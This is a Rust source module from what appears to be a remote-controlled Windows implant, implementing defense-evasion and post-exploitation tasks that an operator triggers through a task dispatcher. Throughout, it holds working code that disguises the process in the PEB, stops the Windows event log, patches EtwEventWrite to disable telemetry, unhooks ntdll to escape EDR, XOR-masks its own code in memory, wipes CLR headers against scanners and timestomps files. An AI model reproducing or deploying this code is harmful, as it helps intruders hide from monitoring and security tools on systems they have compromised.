#![allow(dead_code, non_snake_case, unused_imports, unused_variables, unused_mut)]
// Defense evasion and post-exploitation commands for the Rust agent.

use windows_sys::Win32::Foundation::{CloseHandle, GetLastError, INVALID_HANDLE_VALUE};
use windows_sys::Win32::System::LibraryLoader::{
    GetModuleHandleW, GetProcAddress, LoadLibraryA,
};
use windows_sys::Win32::System::Memory::{
    VirtualProtect, PAGE_EXECUTE_READWRITE, PAGE_READWRITE,
};
use windows_sys::Win32::System::Diagnostics::Debug::{
    GetThreadContext, IsDebuggerPresent,
    CONTEXT, CONTEXT_DEBUG_REGISTERS_AMD64,
};
use windows_sys::Win32::System::Diagnostics::ToolHelp::{
    CreateToolhelp32Snapshot, Module32First, Module32Next,
    MODULEENTRY32, TH32CS_SNAPMODULE,
};
use windows_sys::Win32::System::Threading::{
    GetCurrentProcess, GetCurrentThreadId, OpenThread,
    THREAD_GET_CONTEXT,
};
use crate::transport::{AgentTransport, TaskWire};

// ── Local helpers (mirrors of commands.rs private fns) ───────────────────────

fn wide(s: &str) -> Vec<u16> {
    s.encode_utf16().chain([0u16]).collect()
}

fn shell(cmd: &str) -> String {
    super::shell(cmd)
}

fn ps(script: &str) -> String {
    match std::process::Command::new("powershell.exe")
        .args(["-NoP", "-NonI", "-W", "Hidden", "-C", script])
        .output()
    {
        Ok(o) => {
            let mut s = String::from_utf8_lossy(&o.stdout).into_owned();
            let e = String::from_utf8_lossy(&o.stderr);
            if !e.is_empty() { s.push_str(&e); }
            s
        }
        Err(e) => format!("[ps error: {}]", e),
    }
}

// ── PEB_SPOOF ────────────────────────────────────────────────────────────────

/// Overwrite ImagePathName in RTL_USER_PROCESS_PARAMETERS so that tools reading
/// the PEB (e.g. Process Hacker, Sysmon) see a different executable name.
unsafe fn peb_spoof(fake_name: &str) -> String {
    // NtQueryInformationProcess function type
    #[allow(non_snake_case)]
    type FnNtQueryInfoProc = unsafe extern "system" fn(
        ProcessHandle:            isize,
        ProcessInformationClass:  u32,
        ProcessInformation:       *mut u8,
        ProcessInformationLength: u32,
        ReturnLength:             *mut u32,
    ) -> i32;

    let ntdll = LoadLibraryA(b"ntdll.dll\0".as_ptr());
    if ntdll == 0 { return "LoadLibraryA(ntdll) failed".into(); }

    let nt_fn = GetProcAddress(ntdll, b"NtQueryInformationProcess\0".as_ptr());
    let nt_fn = match nt_fn {
        Some(f) => f,
        None => return "GetProcAddress(NtQueryInformationProcess) failed".into(),
    };
    let nt_query_info: FnNtQueryInfoProc = std::mem::transmute(nt_fn);

    // PROCESS_BASIC_INFORMATION is 48 bytes on x64; PebBaseAddress is at offset 8.
    let mut pbi = [0u8; 48];
    let mut ret_len = 0u32;
    nt_query_info(
        GetCurrentProcess(),
        0, // ProcessBasicInformation
        pbi.as_mut_ptr(),
        48,
        &mut ret_len,
    );

    let peb_ptr = *(pbi.as_ptr().add(8) as *const usize);
    if peb_ptr == 0 { return "failed to get PEB".into(); }

    // PEB.ProcessParameters (RTL_USER_PROCESS_PARAMETERS*) is at PEB+0x20.
    let proc_params_ptr = *((peb_ptr + 0x20) as *const usize);
    if proc_params_ptr == 0 { return "ProcessParameters null".into(); }

    // RTL_USER_PROCESS_PARAMETERS.ImagePathName is a UNICODE_STRING at offset 0x60.
    // UNICODE_STRING layout on x64:
    //   +0x00  Length       : u16
    //   +0x02  MaximumLength: u16
    //   +0x04  (4 bytes padding for 8-byte pointer alignment)
    //   +0x08  Buffer       : *mut u16
    let imgpath_len_ptr = (proc_params_ptr + 0x60) as *mut u16;
    let imgpath_buf_ptr = *((proc_params_ptr + 0x60 + 8) as *const *mut u16);

    if imgpath_buf_ptr.is_null() { return "ImagePathName buffer null".into(); }

    let new_name: Vec<u16> = fake_name.encode_utf16().collect();
    let new_byte_len = (new_name.len() * 2) as u16;

    let mut old = 0u32;
    VirtualProtect(
        imgpath_buf_ptr as *const _,
        new_name.len() * 2 + 2, // +2 so we can null-terminate if desired
        PAGE_READWRITE,
        &mut old,
    );
    std::ptr::copy_nonoverlapping(new_name.as_ptr(), imgpath_buf_ptr, new_name.len());
    *imgpath_len_ptr = new_byte_len;
    VirtualProtect(imgpath_buf_ptr as *const _, new_name.len() * 2 + 2, old, &mut old);

    // Also spoof CommandLine at offset 0x70
    let cmdline_len_ptr = (proc_params_ptr + 0x70) as *mut u16;
    let cmdline_buf_ptr = *((proc_params_ptr + 0x70 + 8) as *const *mut u16);
    if !cmdline_buf_ptr.is_null() {
        let mut old2 = 0u32;
        VirtualProtect(cmdline_buf_ptr as *const _, new_name.len() * 2 + 2, PAGE_READWRITE, &mut old2);
        std::ptr::copy_nonoverlapping(new_name.as_ptr(), cmdline_buf_ptr, new_name.len());
        *cmdline_len_ptr = new_byte_len;
        VirtualProtect(cmdline_buf_ptr as *const _, new_name.len() * 2 + 2, old2, &mut old2);
    }

    format!("[+] PEB ImagePathName spoofed to '{}'", fake_name)
}

// ── EVENTLOG_SUSPEND / EVENTLOG_RESUME ───────────────────────────────────────

fn eventlog_suspend() -> String {
    shell("sc stop eventlog 2>&1")
}

fn eventlog_resume() -> String {
    shell("sc start eventlog 2>&1")
}

// ── EDR_SILENCE ──────────────────────────────────────────────────────────────

/// Patch EtwEventWrite first byte to 0xC3 (RET) to disable ETW telemetry.
unsafe fn edr_silence() -> String {
    let ntdll_w = wide("ntdll.dll");
    let ntdll = GetModuleHandleW(ntdll_w.as_ptr());
    if ntdll == 0 {
        return format!("GetModuleHandleW(ntdll) failed (err {})", GetLastError());
    }

    let fn_addr = match GetProcAddress(ntdll, b"EtwEventWrite\0".as_ptr()) {
        Some(f) => f as *mut u8,
        None => return "GetProcAddress(EtwEventWrite) failed".into(),
    };

    let mut old = 0u32;
    if VirtualProtect(fn_addr as *const _, 1, PAGE_EXECUTE_READWRITE, &mut old) == 0 {
        return format!("VirtualProtect failed (err {})", GetLastError());
    }
    *fn_addr = 0xC3; // RET
    VirtualProtect(fn_addr as *const _, 1, old, &mut old);
    "[+] EtwEventWrite patched — ETW disabled".to_string()
}

// ── EDR_SILENCE_RM ───────────────────────────────────────────────────────────

/// Restore EtwEventWrite by writing back the known x64 function prolog.
/// The known first 4 bytes of EtwEventWrite on x64 Windows 10/11 are:
///   48 89 54 24 10  (mov [rsp+10h], rdx — first MOV of the standard save sequence)
/// We restore the first 4 bytes; the 5th (10) is almost always intact.
unsafe fn edr_silence_rm() -> String {
    let ntdll_w = wide("ntdll.dll");
    let ntdll = GetModuleHandleW(ntdll_w.as_ptr());
    if ntdll == 0 {
        return format!("GetModuleHandleW(ntdll) failed (err {})", GetLastError());
    }

    let fn_addr = match GetProcAddress(ntdll, b"EtwEventWrite\0".as_ptr()) {
        Some(f) => f as *mut u8,
        None => return "GetProcAddress(EtwEventWrite) failed".into(),
    };

    let mut old = 0u32;
    if VirtualProtect(fn_addr as *const _, 8, PAGE_EXECUTE_READWRITE, &mut old) == 0 {
        return format!("VirtualProtect failed (err {})", GetLastError());
    }
    // Restore known x64 EtwEventWrite prolog: mov [rsp+10h],rdx ; mov [rsp+8],rcx
    let prolog: [u8; 8] = [0x48, 0x89, 0x54, 0x24, 0x10, 0x48, 0x89, 0x4C];
    std::ptr::copy_nonoverlapping(prolog.as_ptr(), fn_addr, 8);
    VirtualProtect(fn_addr as *const _, 8, old, &mut old);
    "[+] EtwEventWrite restored".to_string()
}

// ── HOOK_CHECK ───────────────────────────────────────────────────────────────

/// Walk ntdll's export table and flag any Nt*/Zw* functions whose first bytes
/// look like a JMP/CALL/INT3 trampoline hook rather than a syscall stub.
unsafe fn hook_check() -> String {
    let ntdll_w = wide("ntdll.dll");
    let ntdll = GetModuleHandleW(ntdll_w.as_ptr());
    if ntdll == 0 {
        return format!("GetModuleHandleW(ntdll) failed (err {})", GetLastError());
    }

    let base = ntdll as *const u8;

    // e_lfanew: offset to PE signature in the DOS header
    let e_lfanew = *(base.add(0x3c) as *const i32) as usize;
    let nt_hdr = base.add(e_lfanew);

    // Optional header starts at NT header + 4 (sig) + 20 (FileHeader) = +24
    let opt_hdr = nt_hdr.add(24);

    // DataDirectory[0] (Export) is at optional header offset 112 for PE32+
    let export_dir_rva = *(opt_hdr.add(112) as *const u32) as usize;
    if export_dir_rva == 0 { return "no export directory in ntdll".into(); }

    // IMAGE_EXPORT_DIRECTORY
    let exp          = base.add(export_dir_rva);
    let num_funcs    = *(exp.add(20) as *const u32) as usize;
    let num_names    = *(exp.add(24) as *const u32) as usize;
    let addr_rva     = *(exp.add(28) as *const u32) as usize;
    let name_rva     = *(exp.add(32) as *const u32) as usize;
    let ordinal_rva  = *(exp.add(36) as *const u32) as usize;

    let addr_table    = base.add(addr_rva)    as *const u32;
    let name_table    = base.add(name_rva)    as *const u32;
    let ordinal_table = base.add(ordinal_rva) as *const u16;

    let mut hooked: Vec<String> = Vec::new();
    for i in 0..num_names {
        let name_ptr = base.add(*(name_table.add(i)) as usize);
        let name = std::ffi::CStr::from_ptr(name_ptr as *const i8).to_string_lossy();
        if !name.starts_with("Nt") && !name.starts_with("Zw") { continue; }

        let ord = *(ordinal_table.add(i)) as usize;
        if ord >= num_funcs { continue; }
        let fn_rva = *(addr_table.add(ord)) as usize;
        if fn_rva == 0 { continue; }
        let fn_ptr = base.add(fn_rva);

        let b0 = *fn_ptr;
        let b1 = *fn_ptr.add(1);
        let b2 = *fn_ptr.add(2);

        // Normal syscall stub starts with: 4C 8B D1 (mov r10, rcx) or 48 8B C4 or B8 xx
        // A hook is typically: E9 (JMP rel32), FF 25 (JMP [rip+X]), EB (JMP short),
        // E8 (CALL rel32), CC (INT3), or anything other than the expected stub prolog.
        let is_hooked = b0 == 0xE9
            || b0 == 0xE8
            || b0 == 0xCC
            || b0 == 0xEB
            || (b0 == 0xFF && b1 == 0x25)
            || (b0 != 0x4C && b0 != 0x48 && b0 != 0xB8);

        if is_hooked {
            hooked.push(format!("  {} [{:02X} {:02X} {:02X} ...]", name, b0, b1, b2));
        }
    }

    if hooked.is_empty() {
        "[+] no hooks detected in ntdll Nt*/Zw* exports".to_string()
    } else {
        format!("[!] {} hooked function(s):\n{}", hooked.len(), hooked.join("\n"))
    }
}

// ── HW_BP_CHECK ──────────────────────────────────────────────────────────────

/// Read the current thread's debug registers (Dr0–Dr3, Dr7) and report
/// whether any hardware breakpoints are active.
fn hwbp_check() -> String {
    unsafe {
        let tid = GetCurrentThreadId();
        let ht = OpenThread(THREAD_GET_CONTEXT, 0, tid);
        if ht == 0 {
            return format!("OpenThread failed (err {})", GetLastError());
        }
        let mut ctx: CONTEXT = std::mem::zeroed();
        ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS_AMD64;
        if GetThreadContext(ht, &mut ctx) == 0 {
            CloseHandle(ht);
            return format!("GetThreadContext failed (err {})", GetLastError());
        }
        CloseHandle(ht);

        // Dr0–Dr3 hold watched addresses; Dr7 controls enable/condition bits.
        let dr0 = ctx.Dr0;
        let dr1 = ctx.Dr1;
        let dr2 = ctx.Dr2;
        let dr3 = ctx.Dr3;
        let dr7 = ctx.Dr7;

        if dr7 == 0 && dr0 == 0 && dr1 == 0 && dr2 == 0 && dr3 == 0 {
            "[+] no hardware breakpoints active".to_string()
        } else {
            format!(
                "[!] hardware BPs active:\n  Dr0={:#018x}\n  Dr1={:#018x}\n  Dr2={:#018x}\n  Dr3={:#018x}\n  Dr7={:#018x}",
                dr0, dr1, dr2, dr3, dr7
            )
        }
    }
}

// ── EVASION_STATUS ───────────────────────────────────────────────────────────

fn evasion_status() -> String {
    let debugged = unsafe { IsDebuggerPresent() != 0 };
    format!(
        "debugger_present: {}\nprocess_id: {}\ntransport: {}\n",
        debugged,
        std::process::id(),
        crate::config::TRANSPORT,
    )
}

// ── MEM_FLUCTUATE ────────────────────────────────────────────────────────────

/// XOR-encrypt (or decrypt — same operation) all executable PE sections of
/// the current module in-place. Used as a manual sleep-masking primitive.
unsafe fn mem_fluctuate(encrypt: bool) -> String {
    let base = GetModuleHandleW(std::ptr::null()) as *mut u8;
    if base.is_null() {
        return format!("GetModuleHandleW(self) failed (err {})", GetLastError());
    }

    let e_lfanew = *(base.add(0x3c) as *const i32) as usize;
    let nt = base.add(e_lfanew);

    // Verify PE signature: 'PE\0\0' = 0x00004550
    if *(nt as *const u32) != 0x00004550 {
        return "invalid PE header".into();
    }

    let num_sections = *(nt.add(6) as *const u16) as usize;   // FileHeader.NumberOfSections
    let opt_size     = *(nt.add(20) as *const u16) as usize;   // FileHeader.SizeOfOptionalHeader
    // Section table immediately follows: NT hdr sig(4) + FileHeader(20) + OptionalHeader
    let sec_start = nt.add(4 + 20 + opt_size);

    let mut count = 0usize;
    for i in 0..num_sections {
        // IMAGE_SECTION_HEADER is 40 bytes
        let sec       = sec_start.add(i * 40);
        let virt_size = *(sec.add(8)  as *const u32) as usize; // VirtualSize
        let virt_addr = *(sec.add(12) as *const u32) as usize; // VirtualAddress
        let chars     = *(sec.add(36) as *const u32);           // Characteristics

        // IMAGE_SCN_MEM_EXECUTE = 0x20000000
        if chars & 0x20000000 == 0 || virt_size == 0 { continue; }

        let region = base.add(virt_addr);
        let mut old = 0u32;
        if VirtualProtect(region as *const _, virt_size, PAGE_READWRITE, &mut old) != 0 {
            let slice = std::slice::from_raw_parts_mut(region, virt_size);
            for b in slice.iter_mut() { *b ^= 0xA7; }
            VirtualProtect(region as *const _, virt_size, old, &mut old);
            count += 1;
        }
    }

    format!(
        "[+] {} section(s) {}encrypted (key=0xA7)",
        count,
        if encrypt { "" } else { "de" }
    )
}

// ── CLR_STOMP ────────────────────────────────────────────────────────────────

/// Wipe the MZ header of any loaded CLR/mscor* module to defeat memory
/// scanner signatures that identify .NET hosting.
fn clr_stomp() -> String {
    unsafe {
        let snap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, 0);
        if snap == INVALID_HANDLE_VALUE {
            return format!("CreateToolhelp32Snapshot failed (err {})", GetLastError());
        }

        let mut me: MODULEENTRY32 = std::mem::zeroed();
        me.dwSize = std::mem::size_of::<MODULEENTRY32>() as u32;
        let mut stomped = 0u32;

        if Module32First(snap, &mut me) != 0 {
            loop {
                // szModule is [u8; 256] — find null terminator
                let end = me.szModule
                    .iter()
                    .position(|&b| b == 0)
                    .unwrap_or(me.szModule.len());
                let modname = String::from_utf8_lossy(&me.szModule[..end]).to_ascii_lowercase();

                if modname.contains("clr") || modname.contains("mscor") {
                    let base: *mut u8 = me.modBaseAddr;
                    if !base.is_null() && *base == 0x4D && *base.add(1) == 0x5A {
                        let mut old = 0u32;
                        VirtualProtect(base as *const _, 2, PAGE_READWRITE, &mut old);
                        *base         = 0x00;
                        *base.add(1)  = 0x00;
                        VirtualProtect(base as *const _, 2, old, &mut old);
                        stomped += 1;
                    }
                }

                if Module32Next(snap, &mut me) == 0 { break; }
            }
        }

        CloseHandle(snap);
        format!("[+] stomped {} CLR module header(s)", stomped)
    }
}

// ── TIMESTOMP ────────────────────────────────────────────────────────────────

/// Copy creation/write/access timestamps from a reference file onto the target.
/// Uses PowerShell to avoid Win32 API complexity.
fn timestomp_cmd(target: &str, reference: &str) -> String {
    let script = format!(
        "$ref=Get-Item '{}';$tgt=Get-Item '{}';\
         $tgt.CreationTime=$ref.CreationTime;\
         $tgt.LastWriteTime=$ref.LastWriteTime;\
         $tgt.LastAccessTime=$ref.LastAccessTime;\
         'done'",
        reference, target
    );
    ps(&script)
}

// ── DRIVES ───────────────────────────────────────────────────────────────────

/// List logical drives, their type, size, and free space.
fn drives() -> String {
    let out = ps(
        "[System.IO.DriveInfo]::GetDrives() | ForEach-Object { \
         '{0,-6} {1,-12} {2,10}MB total {3,10}MB free' -f \
         $_.Name, $_.DriveType, \
         $(try{[int]($_.TotalSize/1MB)}catch{0}), \
         $(try{[int]($_.AvailableFreeSpace/1MB)}catch{0}) \
         } | Out-String",
    );
    if out.trim().is_empty() {
        shell("wmic logicaldisk get Caption,DriveType,Description,Size /value 2>&1")
    } else {
        out
    }
}

// ── NTDLL_UNHOOK ─────────────────────────────────────────────────────────────

unsafe fn ntdll_unhook() -> String {
    use windows_sys::Win32::System::LibraryLoader::{
        LoadLibraryExW, LOAD_LIBRARY_AS_DATAFILE,
    };
    use windows_sys::Win32::Foundation::FreeLibrary;
    use windows_sys::Win32::System::SystemServices::{
        IMAGE_DOS_HEADER, IMAGE_EXPORT_DIRECTORY,
    };
    use windows_sys::Win32::System::Diagnostics::Debug::IMAGE_NT_HEADERS64;

    let ntdll_w: Vec<u16> = "ntdll.dll\0".encode_utf16().collect();

    // Get the loaded ntdll base
    let loaded = GetModuleHandleW(ntdll_w.as_ptr()) as usize;
    if loaded == 0 {
        return "[!] GetModuleHandleW(ntdll) failed".to_string();
    }

    // Load a fresh clean copy from disk as a data file (not executed)
    let clean_raw = LoadLibraryExW(ntdll_w.as_ptr(), 0, LOAD_LIBRARY_AS_DATAFILE) as usize;
    if clean_raw == 0 {
        return "[!] LoadLibraryExW(ntdll, DATAFILE) failed".to_string();
    }

    // LOAD_LIBRARY_AS_DATAFILE sets the low two bits — mask them to get the real base
    let clean_base = clean_raw & !0x3_usize;

    let dos = &*(loaded as *const IMAGE_DOS_HEADER);
    let nt  = &*((loaded + dos.e_lfanew as usize) as *const IMAGE_NT_HEADERS64);
    let exp_rva = nt.OptionalHeader.DataDirectory[0].VirtualAddress as usize;
    if exp_rva == 0 {
        FreeLibrary(clean_raw as isize);
        return "[!] no export directory".to_string();
    }
    let exp = &*((loaded + exp_rva) as *const IMAGE_EXPORT_DIRECTORY);
    let n_funcs   = exp.NumberOfNames as usize;
    let names_arr = (loaded + exp.AddressOfNames as usize) as *const u32;
    let ords_arr  = (loaded + exp.AddressOfNameOrdinals as usize) as *const u16;
    let fns_arr   = (loaded + exp.AddressOfFunctions as usize) as *const u32;

    let mut unhooked = 0u32;

    for i in 0..n_funcs {
        let name_rva = *names_arr.add(i) as usize;
        let name_ptr = (loaded + name_rva) as *const u8;
        // Only process Nt* exports
        if *name_ptr != b'N' || *name_ptr.add(1) != b't' { continue; }

        let ord     = *ords_arr.add(i) as usize;
        let fn_rva  = *fns_arr.add(ord) as usize;
        let fn_ptr  = (loaded + fn_rva) as *mut u8;

        // Detect hook: JMP (E9), CALL (E8), INT3 (CC)
        let first = *fn_ptr;
        if first != 0xE9 && first != 0xE8 && first != 0xCC { continue; }

        let clean_ptr = (clean_base + fn_rva) as *const u8;

        let mut old: u32 = 0;
        if VirtualProtect(fn_ptr as *mut _, 16, PAGE_EXECUTE_READWRITE, &mut old) != 0 {
            std::ptr::copy_nonoverlapping(clean_ptr, fn_ptr, 16);
            VirtualProtect(fn_ptr as *mut _, 16, old, &mut old);
            unhooked += 1;
        }
    }

    FreeLibrary(clean_raw as isize);
    format!("[+] unhooked {} Nt* functions", unhooked)
}

// ── Dispatcher ───────────────────────────────────────────────────────────────

/// Returns true if the task type was handled here, false to let the caller
/// fall through to an "unknown task" error.
pub fn dispatch(t: &mut AgentTransport, task: &TaskWire) -> bool {
    let typ = task.typ.to_uppercase();
    match typ.as_str() {
        "PEB_SPOOF" => {
            let name = serde_json::from_str::<serde_json::Value>(&task.args)
                .ok()
                .and_then(|v| v.get("name").and_then(|n| n.as_str()).map(String::from))
                .unwrap_or_else(|| task.args.trim_matches('"').to_string());
            if name.is_empty() {
                t.send_result(task.id, "", "PEB_SPOOF requires {\"name\":\"svchost.exe\"}");
                return true;
            }
            let r = unsafe { peb_spoof(&name) };
            t.send_result(task.id, &r, "");
            true
        }

        "EVENTLOG_SUSPEND" => {
            t.send_result(task.id, &eventlog_suspend(), "");
            true
        }

        "EVENTLOG_RESUME" => {
            t.send_result(task.id, &eventlog_resume(), "");
            true
        }

        "EDR_SILENCE" => {
            let r = unsafe { edr_silence() };
            t.send_result(task.id, &r, "");
            true
        }

        "EDR_SILENCE_RM" => {
            let r = unsafe { edr_silence_rm() };
            t.send_result(task.id, &r, "");
            true
        }

        "HOOK_CHECK" => {
            let r = unsafe { hook_check() };
            t.send_result(task.id, &r, "");
            true
        }

        "HW_BP_CHECK" => {
            t.send_result(task.id, &hwbp_check(), "");
            true
        }

        "EVASION_STATUS" => {
            t.send_result(task.id, &evasion_status(), "");
            true
        }

        "MEM_FLUCTUATE" => {
            let j: serde_json::Value =
                serde_json::from_str(&task.args).unwrap_or_default();
            let action = j.get("action")
                .and_then(|v| v.as_str())
                .unwrap_or("encrypt");
            let encrypt = action != "decrypt";
            let r = unsafe { mem_fluctuate(encrypt) };
            t.send_result(task.id, &r, "");
            true
        }

        "CLR_STOMP" => {
            t.send_result(task.id, &clr_stomp(), "");
            true
        }

        "TIMESTOMP" => {
            let j: serde_json::Value =
                serde_json::from_str(&task.args).unwrap_or_default();
            let target = j.get("path")
                .and_then(|v| v.as_str())
                .unwrap_or("");
            if target.is_empty() {
                t.send_result(task.id, "", "TIMESTOMP requires {\"path\":\"...\"}");
                return true;
            }
            let reference = j.get("ref")
                .and_then(|v| v.as_str())
                .unwrap_or("C:\\Windows\\System32\\kernel32.dll");
            t.send_result(task.id, &timestomp_cmd(target, reference), "");
            true
        }

        "DRIVES" => {
            t.send_result(task.id, &drives(), "");
            true
        }

        "NTDLL_UNHOOK" => {
            let r = unsafe { ntdll_unhook() };
            t.send_result(task.id, &r, "");
            true
        }

        _ => false,
    }
}
